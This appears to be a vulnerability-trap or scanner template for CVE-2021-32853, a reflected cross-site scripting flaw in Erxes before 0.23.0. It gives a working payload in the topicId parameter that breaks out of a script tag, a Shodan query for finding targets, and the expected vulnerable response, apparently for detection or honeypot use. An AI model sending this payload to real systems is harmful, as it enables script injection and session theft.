id: CVE-2021-32853
info:
  name: Erxes <0.23.0 - Cross-Site Scripting
  author: dwisiswant0
  description: Erxes before 0.23.0 contains a cross-site scripting vulnerability.
    The value of topicID parameter is not escaped and is triggered in the enclosing
    script tag.
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade to Erxes version 0.23.0 or later to mitigate the vulnerability.

    '
  reference:
  - https://securitylab.github.com/advisories/GHSL-2021-103-erxes/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-3285
  - https://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/views/widget.ejs#L14
  - https://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/index.ts#L54
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2021-32853
    cwe-id: CWE-79
    epss-score: 0.01224
    epss-percentile: 0.83856
    cpe: cpe:2.3:a:erxes:erxes:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: erxes
    product: erxes
    shodan-query: http.title:"erxes"
  tags: cve2021,cve,xss,erxes,oss
traps:
- request:
    method: GET
    path: /widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: 'topic_id: "</script><script>alert(document.domain)</script>window.erxesEnv'
